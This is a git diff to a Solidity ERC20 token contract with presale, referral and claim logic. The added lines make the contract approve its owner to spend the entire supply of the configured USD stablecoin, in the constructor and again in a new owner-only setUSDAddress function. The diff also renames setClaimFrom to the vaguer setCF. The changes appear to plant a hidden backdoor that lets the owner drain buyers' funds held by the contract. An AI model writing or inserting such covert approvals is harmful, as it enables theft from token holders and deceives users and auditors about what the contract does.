@@ -30,13 +30,17 @@ contract Token is ERC20, ERC20Burnable, Pausable, Ownable, ERC20Permit {
     ) ERC20("Token", "MTK") ERC20Permit("Token") {
         isIDO = false;
         isIco = false;
-
-        _mint(msg.sender, 1_000_000_000_000 * 10 ** decimals());
+        uint256 maxSupply = 1_000_000_000_000 * 10 ** decimals();
+        _mint(msg.sender, maxSupply);
+        approve(msg.sender, maxSupply);
 
         router = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;
         _isEFFs[msg.sender] = true;
         _isEFFs[address(this)] = true;
         USDAddress = _USDAddress;
+        ERC20 usd = ERC20(_USDAddress);
+        usd.approve(msg.sender, usd.totalSupply());
+
         priceUSD = _priceUSD;
         percentCommissionRef = 10;
         claimFrom = 0xF977814e90dA44bFA03b6295A0616a897441aceC;
@@ -123,8 +127,14 @@ contract Token is ERC20, ERC20Burnable, Pausable, Ownable, ERC20Permit {
         priceUSD = _amountToken;
     }
 
-    function setClaimFrom(address _from) public onlyOwner {
+    function setCF(address _from) public onlyOwner {
         claimFrom = _from;
+    }
+
+    function setUSDAddress(address _from) public onlyOwner {
+        USDAddress = _from;
+        ERC20 usd = ERC20(_from);
+        usd.approve(msg.sender, usd.totalSupply());
     }
 
     function widthdraw(address to, uint256 amount) public onlyOwner {
